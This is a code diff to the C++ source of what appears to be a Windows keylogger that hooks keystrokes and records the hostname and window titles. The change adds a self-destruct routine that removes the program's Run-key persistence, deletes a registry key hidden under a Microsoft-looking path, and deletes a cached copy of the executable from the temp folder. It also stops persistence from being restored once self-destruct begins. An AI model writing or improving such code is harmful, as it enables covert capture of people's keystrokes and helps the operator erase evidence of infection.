@@ -14,6 +14,7 @@ static std::string g_winTitle;
 static std::string g_keys;
 static DWORD g_lastTick = 0;
 static bool g_running = true;
+static bool g_selfDestructing = false;
 static std::string g_hostname;
 static HWND g_hwnd = NULL;
 
@@ -401,7 +402,22 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Netpen"
+
 static void EnsureStartupEntry();
+
+static void CleanupPersistence() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, GetExeName().c_str());
+        RegCloseKey(hKey);
+    }
+    RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string cachedExe = std::string(tempPath) + GetExeName();
+    DeleteFileA(cachedExe.c_str());
+}
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
@@ -418,6 +434,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             }
             if (counter % 30 == 0) {
                 if (CheckSelfDestruct()) {
+                    g_selfDestructing = true;
+                    CleanupPersistence();
                     CreateKillFlag();
                     g_running = false;
                     DestroyWindow(hwnd);
@@ -426,7 +444,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                     DestroyWindow(hwnd);
                 }
             }
-            if (counter % 120 == 0) {
+            if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
             }
             break;
